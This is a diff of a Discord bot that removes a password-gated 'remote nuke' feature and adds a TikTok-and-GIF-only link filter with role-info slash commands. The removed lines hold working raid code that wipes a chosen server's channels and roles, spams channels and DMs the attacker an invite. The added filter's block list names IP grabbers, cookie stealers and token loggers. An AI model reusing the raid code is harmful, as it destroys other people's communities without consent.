@@ -1,150 +1,238 @@
+const http = require("http");
 const {
+  EmbedBuilder,
   Client,
   GatewayIntentBits,
+  Partials,
   SlashCommandBuilder,
-  REST,
-  Routes,
-  EmbedBuilder,
-  ActionRowBuilder,
-  StringSelectMenuBuilder,
-  ButtonBuilder,
-  ButtonStyle,
-  ModalBuilder,
-  TextInputBuilder,
-  TextInputStyle,
-  ChannelType
-} = require('discord.js');
+  PermissionFlagsBits,
+} = require("discord.js");
 
-const express = require('express');
-const fs = require('fs');
-require('dotenv').config();
+const TOKEN = process.env.TOKEN || process.env.DISCORD_TOKEN;
+const PORT = process.env.PORT || 3000;
+const FAME_GAME_NAME = process.env.FAME_GAME_NAME || "Fame";
+const FOUNDER_ROLE_ID = "1482560426972549232";
 
-const TOKEN = process.env.TOKEN;
-const CLIENT_ID = process.env.CLIENT_ID;
+if (!TOKEN) {
+  console.error("Missing TOKEN environment variable");
+  process.exit(1);
+}
 
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.GuildMembers,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildBans
-  ]
+    GatewayIntentBits.GuildModeration,
+  ],
+  partials: [Partials.Channel],
 });
 
-// READY
-client.once('ready', () => {
-  console.log(`${client.user.tag} is online`);
-});
+// ==================== LINK FILTER ====================
+// Allowed: TikTok links (including short vm.tiktok.com links)
+const tiktokRegex = /https?:\/\/(?:www\.|m\.|vm\.)?tiktok\.com\/(?:@[\w.-]+\/video\/\d+|[\w-]+|Z[a-zA-Z0-9]+)/i;
 
-// MESSAGE EVENTS
-client.on('messageCreate', async message => {
+// Dangerous / blocked patterns
+const dangerousPatterns = [
+  /discord\.(gg|com|app)\/(invite\/)?[a-zA-Z0-9-]+/i,
+  /grabify\.link|iplogger\.org|ipgrabber|blasze\.com|trackip|myip\.is|ip-tracker/i,
+  /roblox\.(com\.[a-z]{2,}|gg|app|site|xyz|fun|net|org|login|verify|gift|free|robux)/i,
+  /rblx\.|rblox\.|robloxx?\.|free-robux|robux\.gift|getrobux/i,
+  /cookie-logger|cookielogger|stealer|grabber|token-logger|beam\.link/i,
+];
+
+client.on("messageCreate", async (message) => {
   if (message.author.bot || !message.guild) return;
 
-  const content = message.content.trim().toLowerCase();
+  const urlRegex = /(https?:\/\/[^\s]+)/gi;
+  const urls = message.content.match(urlRegex) || [];
 
-  if (content === '!fb') {
-    const embed = new EmbedBuilder()
-      .setColor('#ff0000')
-      .setTitle('🔴 REMOTE NUKE')
-      .setDescription('Enter password, then choose server.')
-      .setFooter({ text: 'Click below' });
+  let shouldBlock = false;
+  let reason = "";
 
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
-    );
+  for (const url of urls) {
+    const lowerUrl = url.toLowerCase();
 
-    await message.reply({ embeds: [embed], components: [row] });
-  }
+    // 1. Allow TikTok links
+    if (tiktokRegex.test(url)) continue;
 
-  if (content === '!servers') {
-    const guilds = client.guilds.cache;
-    let text = `**Servers (${guilds.size}):**\n\n`;
-    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
-    message.reply(text.length > 2000 ? 'List too long. Check console.' : text);
-    return;
-  }
+    // 2. Completely ignore ALL GIF links
+    if (
+      lowerUrl.endsWith('.gif') ||
+      lowerUrl.includes('tenor.com') ||
+      lowerUrl.includes('giphy.com') ||
+      lowerUrl.includes('cdn.discordapp.com') ||
+      lowerUrl.includes('media.discordapp.net') ||
+      lowerUrl.includes('imgur.com')
+    ) {
+      continue;
+    }
 
-  if (content === '!invite') {
-    let text = '**Server Invites:**\n\n';
-    for (const guild of client.guilds.cache.values()) {
-      try {
-        const invite = await guild.channels.cache.filter(c => c.type === 0).first()?.createInvite({ maxAge: 0 }) || 'No permission';
-        text += `**${guild.name}** → https://discord.gg/${invite.code}\n`;
-      } catch (e) {
-        text += `**${guild.name}** → No permission\n`;
+    // 3. Check for malicious patterns
+    for (const pattern of dangerousPatterns) {
+      if (pattern.test(lowerUrl)) {
+        shouldBlock = true;
+        reason = "Malicious link (Cookie Stealer, IP Grabber, or Fake Roblox)";
+        break;
       }
     }
-    message.reply(text);
-    return;
+    if (shouldBlock) break;
+
+    // 4. Block any other link that is not TikTok or GIF
+    if (lowerUrl.startsWith('http')) {
+      shouldBlock = true;
+      reason = "Only TikTok links and GIFs are allowed in this server.";
+      break;
+    }
+  }
+
+  if (shouldBlock) {
+    try {
+      await message.delete().catch(() => {});
+
+      const member = await message.guild.members.fetch(message.author.id).catch(() => null);
+      if (member) {
+        await member.timeout(10 * 60 * 1000, `Posted blocked link: ${reason}`).catch(() => {});
+      }
+
+      const warningEmbed = new EmbedBuilder()
+        .setTitle("🚫 Unsafe Link Blocked")
+        .setDescription(`${message.author}, your message has been removed.`)
+        .addFields(
+          { name: "Reason", value: reason, inline: false },
+          { name: "Allowed Links", value: "TikTok links and **any GIFs**", inline: false }
+        )
+        .setColor(0xff0000)
+        .setTimestamp();
+
+      const warningMsg = await message.channel.send({ embeds: [warningEmbed] });
+      setTimeout(() => warningMsg.delete().catch(() => {}), 10000);
+
+      console.log(`[LINK BLOCKED] ${message.author.tag} → ${reason}`);
+    } catch (err) {
+      console.error("[LINK BLOCKER ERROR]", err);
+    }
   }
 });
 
-// FIXED INTERACTIONS
-client.on('interactionCreate', async interaction => {
-  if (!interaction.customId) return;
+// ==================== SLASH COMMANDS ====================
 
-  try {
-    const userId = interaction.customId.split('_')[2];
-    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
+client.once("ready", async () => {
+  console.log(`${FAME_GAME_NAME} Bot is online!`);
+  console.log(`→ TikTok links allowed`);
+  console.log(`→ ALL GIF links allowed`);
+  console.log(`→ Everything else blocked + 10 min timeout`);
 
-    if (interaction.isButton() && interaction.customId.startsWith('fb_start_')) {
-      const modal = new ModalBuilder().setCustomId(`fb_modal_${userId}`).setTitle('Enter Password');
-      modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)));
-      await interaction.showModal(modal);
-    }
+  // Register slash commands
+  const commands = [
+    new SlashCommandBuilder()
+      .setName("copyrole")
+      .setDescription("Copy role information")
+      .setDefaultMemberPermissions(PermissionFlagsBits.ManageRoles)
+      .addSubcommand(sub =>
+        sub
+          .setName("hex")
+          .setDescription("Copy the hex color(s) of a role")
+          .addRoleOption(option =>
+            option.setName("role").setDescription("The role to copy colors from").setRequired(true)
+          )
+      )
+      .addSubcommand(sub =>
+        sub
+          .setName("emoji")
+          .setDescription("Copy the emoji of a role")
+          .addRoleOption(option =>
+            option.setName("role").setDescription("The role to copy emoji from").setRequired(true)
+          )
+      )
+  ];
 
-    if (interaction.isModalSubmit() && interaction.customId.startsWith('fb_modal_')) {
-      const password = interaction.fields.getTextInputValue('password');
-      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
-
-      const servers = client.guilds.cache.map(g => ({
-        label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
-        value: g.id,
-        description: `${g.memberCount} members`
-      }));
-
-      const menu = new StringSelectMenuBuilder().setCustomId(`fb_server_${userId}`).setPlaceholder('Choose server to NUKE').addOptions(servers);
-      const row = new ActionRowBuilder().addComponents(menu);
-
-      await interaction.reply({ content: '✅ Password correct! Select server:', components: [row], ephemeral: true });
-    }
-
-    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
-      await interaction.deferUpdate();
-
-      const guildId = interaction.values[0];
-      const guild = client.guilds.cache.get(guildId);
-
-      if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });
-
-      const user = interaction.user;
-
-      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Deleting everything...`, ephemeral: true });
-
-      try {
-        for (const channel of guild.channels.cache.values()) await channel.delete().catch(() => {});
-        for (const role of guild.roles.cache.values()) {
-          if (role.name === '@everyone' || role.name === 'Owner') continue;
-          await role.delete().catch(() => {});
-        }
-
-        const ew = await guild.channels.create({ name: 'ew', type: ChannelType.GuildText });
-        for (let i = 0; i < 40; i++) {
-          await guild.channels.create({ name: 'ew', type: ChannelType.GuildText }).catch(() => {});
-        }
-        const invite = await ew.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
-        if (invite) await user.send(`✅ Raid finished!\nInvite: https://discord.gg/${invite.code}`);
-
-        await interaction.followUp({ content: `✅ **${guild.name}** nuked! Check your DMs.`, ephemeral: true });
-      } catch (err) {
-        console.error(err);
-        await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
-      }
-    }
-  } catch (error) {
-    console.error(error);
-  }
+  await client.application.commands.set(commands);
+  console.log("Slash commands registered: /copyrole hex and /copyrole emoji");
 });
+
+client.on("interactionCreate", async (interaction) => {
+  if (!interaction.isChatInputCommand()) return;
+
+  if (interaction.commandName === "copyrole") {
+    const subcommand = interaction.options.getSubcommand();
+    const role = interaction.options.getRole("role");
+
+    if (subcommand === "hex") {
+      // Get role colors
+      const color = role.color ? `#${role.color.toString(16).padStart(6, '0').toUpperCase()}` : "No color (transparent)";
+
+      // For gradient roles (Discord supports up to 2 colors in some cases via unicode emoji tricks, but usually 1)
+      // We'll show the main color + note if it's a gradient role
+      let description = `**Main Color:** ${color}`;
+
+      if (role.icon) {
+        description += `\n**Note:** This role has a custom icon.`;
+      }
+
+      const embed = new EmbedBuilder()
+        .setTitle(`🎨 Role Colors - ${role.name}`)
+        .setDescription(description)
+        .setColor(role.color || 0x2f3136)
+        .addFields(
+          { name: "Hex Code", value: `\`${color}\``, inline: true },
+          { name: "Role ID", value: `\`${role.id}\``, inline: true }
+        )
+        .setTimestamp();
+
+      await interaction.reply({ embeds: [embed] });
+    }
+
+    else if (subcommand === "emoji") {
+      if (!role.unicodeEmoji && !role.icon) {
+        return interaction.reply({
+          content: `❌ The role **${role.name}** has no emoji or icon.`,
+          ephemeral: true
+        });
+      }
+
+      let emojiText = "";
+
+      if (role.unicodeEmoji) {
+        emojiText = role.unicodeEmoji;
+      } else if (role.icon) {
+        emojiText = `[Custom Icon] (Cannot be copied as text)`;
+      }
+
+      const embed = new EmbedBuilder()
+        .setTitle(`📋 Role Emoji - ${role.name}`)
+        .setDescription(`**Emoji:** ${emojiText}`)
+        .setColor(role.color || 0x2f3136)
+        .addFields({ name: "Role Name", value: role.name, inline: true })
+        .setTimestamp();
+
+      await interaction.reply({
+        embeds: [embed],
+        content: role.unicodeEmoji ? `**Copied Emoji:** ${role.unicodeEmoji}` : undefined
+      });
+    }
+  }
+
+  // Add your old /roleall command here if you still want it
+  // if (interaction.commandName === "roleall") { ... }
+});
+
+// ==================== ERROR HANDLING ====================
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+process.on("unhandledRejection", console.error);
+process.on("uncaughtException", console.error);
 
 client.login(TOKEN);
+
+// HTTP Server for uptime monitoring
+http.createServer((req, res) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Content-Type", "application/json");
+  res.end(JSON.stringify({ 
+    status: "online", 
+    message: `${FAME_GAME_NAME} Bot - TikTok + All GIFs Allowed` 
+  }));
+}).listen(PORT);
